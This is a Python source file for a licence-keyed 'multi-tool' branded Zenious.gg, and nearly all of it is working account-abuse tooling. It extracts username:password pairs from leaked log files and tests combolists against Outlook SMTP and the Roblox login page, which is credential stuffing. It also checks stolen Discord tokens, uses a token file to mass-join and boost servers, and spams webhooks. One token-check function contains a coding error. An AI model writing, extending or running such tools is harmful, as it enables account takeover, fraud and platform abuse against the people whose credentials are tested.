import os
import re
import shutil
import time
import itertools
import threading
import requests
import uuid
import platform
import hashlib
import smtplib

# ── Selenium imports for the Roblox‑login checker ─────────────────────────────
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
# ────────────────────────────────────────────────────────────────────────────────

# Flag to control the animation loop
animation_running = True

def set_window_title(title):
    if os.name == 'nt':
        os.system(f'title {title}')
    else:
        print(f'\33]0;{title}\a', end='', flush=True)

def print_colored_logo_with_wave_effect():
    global animation_running
    logo = [
        " ________                     __                               ",
        "|        \\                   |  \\                              ",
        " \\$$$$$$$$ ______   _______   \\$$  ______   __    __   _______ ",
        "    /  $$ /      \\ |       \\ |  \\ /      \\ |  \\  |  \\ /       \\",
        "   /  $$  |  $$$$$$\\| $$$$$$$\\| $$| $$$$$$$\\| $$  | $$|  $$$$$$$",
        "  /  $$___| $$    $$| $$  | $$| $$| $$  | $$| $$  | $$ \\$$    \\ ",
        " /  $$    \\\\$$$$$$$\\| $$  | $$| $$| $$__/ $$| $$__/ $$ _\\$$$$$$\\",
        "|  $$     _\\$$     \\| $$  | $$| $$ \\$$    $$ \\$$    $$|       $$",
        " \\$$$$$$$$ \\$$$$$$$ \\$$   \\$$ \\$$  \\$$$$$$   \\$$$$$$  \\$$$$$$$ ",
        "                                                                ",
        "                                                                ",
        "                                                                ",
        "   __                          __                               ",
        "  |  \\                        |  \\                              ",
        " _| $$_     ______    ______  | $$  _______                     ",
        "|   $$ \\   /      \\  /      \\ | $$ /       \\                    ",
        " \\$$$$$$  |  $$$$$$\\|  $$$$$$\\| $$|  $$$$$$$                    ",
        "  | $$ __ | $$  | $$| $$  | $$| $$ \\$$    \\                     ",
        "  | $$|  \\| $$__/ $$| $$__/ $$| $$ _\\$$$$$$\\                    ",
        "   \\$$  $$ \\$$    $$ \\$$    $$| $$|       $$                    ",
        "    \\$$$$   \\$$$$$$   \\$$$$$$  \\$$ \\$$$$$$$                    "
    ]

    colors = ['\033[94m', '\033[95m']
    RESET = '\033[0m'
    terminal_width = shutil.get_terminal_size().columns

    def print_logo_with_colors(colors):
        os.system('cls' if os.name == 'nt' else 'clear')
        for i, line in enumerate(logo):
            color = colors[i % len(colors)]
            print(color + line.center(terminal_width) + RESET)

    color_cycle = itertools.cycle(colors)

    try:
        while animation_running:
            current_colors = [next(color_cycle) for _ in range(len(logo))]
            print_logo_with_colors(current_colors)
            time.sleep(0.05)
    except KeyboardInterrupt:
        pass

def get_hwid():
    system_info = platform.system() + platform.machine() + platform.node() + platform.processor()
    mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    unique_info = system_info + mac_address
    return hashlib.sha256(unique_info.encode()).hexdigest()

def fetch_keys_from_github(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.text.splitlines()
    else:
        print("Failed to fetch keys from GitHub.")
        return []

def validate_key(url, user_key):
    hwid = get_hwid()
    key_hwid_pairs = fetch_keys_from_github(url)
    for pair in key_hwid_pairs:
        if ':' not in pair:
            continue
        key, stored_hwid = pair.split(':', 1)
        if key == user_key and stored_hwid == hwid:
            return True
    return False

def process_file(input_file_path, output_folder, search_term):
    os.makedirs(output_folder, exist_ok=True)
    output_file_path = os.path.join(output_folder, "extracted_accounts.txt")
    with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as file:
        lines = file.readlines()
    unique_accounts = set()
    with open(output_file_path, 'w', encoding='utf-8') as output_file:
        for line in lines:
            if search_term in line:
                match = re.search(r'://(?:[^:]+:)([^:]+):([^\s]+)', line)
                if match:
                    user, password = match.groups()
                    acct = f"{user}:{password}"
                    if acct not in unique_accounts:
                        output_file.write(acct + "\n")
                        unique_accounts.add(acct)
    print(f"Processed lines saved to {output_file_path}")
    time.sleep(0.5)
    os.system("cls")

def spam_webhook(webhook_url, message, count):
    for i in range(count):
        r = requests.post(webhook_url, json={'content': message})
        print(f"Message sent {i+1}/{count}" if r.status_code==204 else f"Failed {i+1}/{count}")
        time.sleep(0.2)

def check_hotmail_outlook_accounts(input_file_path):
    output_file_path = "active_hotmails.txt"
    with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    valid = []
    for line in lines:
        line=line.strip()
        if ':' not in line:
            print(f"Skipping invalid line: {line}")
            continue
        email,password = line.split(':',1)
        try:
            smtp=smtplib.SMTP('smtp.office365.com',587)
            smtp.starttls()
            smtp.login(email,password)
            smtp.quit()
            valid.append(f"{email}:{password}")
            print(f"Valid: {email}")
        except:
            print(f"Invalid: {email}")
    with open(output_file_path,'w') as out:
        out.write("\n".join(valid))
    print(f"Valid accounts saved to {output_file_path}")
    time.sleep(0.5)
    os.system("cls")

def check_discord_token(token):
    h = {'Authorization': token}
    r = requests.get('https://discord.com/api/v9/users/@me', headers=h)
    if r.status_code==200:
        d=r.json()
        nitro=d.get('premium_type',0)
        status = ["No Nitro","Nitro Classic","Nitro"].get(nitro, "Unknown")
        return True, d['username'], status
    return False, None, None

def boost_nitro_server(token_file_path, invite_code):
    with open(token_file_path,'r',errors='ignore') as f:
        tokens=f.readlines()
    for t in tokens:
        t=t.strip()
        h={'Authorization':t}
        jr = requests.post(f'https://discord.com/api/v9/invites/{invite_code}', headers=h, json={"type":1})
        print(f"Joined with {t}" if jr.status_code==200 else f"Failed join {t}")
        for _ in range(2):
            br = requests.post('https://discord.com/api/v9/guilds/premium/subscription-slots', headers=h, json={"user_premium_guild_subscription_slot_ids":[""]})
            print(f"Boosted {t}" if br.status_code==201 else f"Failed boost {t}")

# ── Selenium setup for Roblox login checker ───────────────────────────────────
WINDOW_SIZE = "1280,720"
options = webdriver.ChromeOptions()
options.add_argument(f"--window-size={WINDOW_SIZE}")
options.add_experimental_option('excludeSwitches',['enable-logging'])
options.add_experimental_option('detach',True)
chromedriver_path = r'chromedriver.exe'
service = Service(chromedriver_path)
# ───────────────────────────────────────────────────────────────────────────────

def check_login():
    comboName = input("Combolist name: ")
    with open(comboName + ".txt") as f:
        combos=[l.strip() for l in f if l.strip()]
    for combo in combos:
        user, pw = combo.split(":",1)
        try:
            driver = webdriver.Chrome(service=service, options=options)
        except WebDriverException:
            print(f"[!] Could not start browser for {combo}")
            continue
        try:
            driver.get("https://www.roblox.com/Login")
            try:
                WebDriverWait(driver,5).until(
                    EC.element_to_be_clickable((By.XPATH,"//*[contains(text(),'Accept All')]"))
                ).click()
            except TimeoutException:
                pass
            WebDriverWait(driver,10).until(EC.presence_of_element_located((By.NAME,"username"))).send_keys(user)
            driver.find_element(By.NAME,"password").send_keys(pw)
            driver.find_element(By.ID,"login-button").click()
            try:
                WebDriverWait(driver,5).until(EC.presence_of_element_located((By.XPATH,"//p[@id='login-form-error']")))
                print(f"[!] BAD: {combo}")
            except TimeoutException:
                print(f"[!] GOOD: {combo}")
        finally:
            driver.quit()

def main():
    global animation_running
    set_window_title("Zenious.gg")
    logo_thread = threading.Thread(target=print_colored_logo_with_wave_effect)
    logo_thread.daemon = True
    logo_thread.start()
    time.sleep(2)
    animation_running = False
    logo_thread.join()
    os.system('cls' if os.name=='nt' else 'clear')

    BLUE = '\033[94m'; PURPLE = '\033[95m'; RESET = '\033[0m'
    while True:
        print(f"{BLUE}Multi-Tool Menu:{RESET}")
        print(f"{PURPLE}1. Process File{RESET}")
        print(f"{BLUE}2. Spam Webhook{RESET}")
        print(f"{PURPLE}3. Validate Discord Token{RESET}")
        print(f"{BLUE}4. Check Hotmail/Outlook Accounts{RESET}")
        print(f"{PURPLE}5. Boost Nitro Server{RESET}")
        print(f"{BLUE}6. Check Roblox Logins{RESET}")
        print(f"{PURPLE}7. Exit{RESET}")

        choice = input(f"{PURPLE}Option : {RESET}")
        os.system('cls')

        if choice=='1':
            search = input("Enter the search term: ")
            process_file('in.txt','output',search)
        elif choice=='2':
            url=input("Webhook URL: "); msg=input("Message: "); cnt=int(input("Count: "))
            spam_webhook(url,msg,cnt)
        elif choice=='3':
            token=input("Discord token: ")
            ok,un,nit=check_discord_token(token)
            print(f"Valid: {un}, Nitro: {nit}" if ok else "Token invalid.")
        elif choice=='4':
            path=input("Combo file path: ")
            check_hotmail_outlook_accounts(path)
        elif choice=='5':
            code=input("Server invite code: ")
            boost_nitro_server('1m.txt',code)
        elif choice=='6':
            check_login()
        elif choice=='7':
            print("Exiting."); break
        else:
            print("Invalid option."); time.sleep(0.5)

def check_key_and_run():
    url="https://raw.githubusercontent.com/hxizx/boring/refs/heads/main/keys.txt"
    key=input("Enter your key: ")
    if validate_key(url,key):
        print("Access granted."); time.sleep(1); main()
    else:
        print("Access denied.")

if __name__=="__main__":
    check_key_and_run()
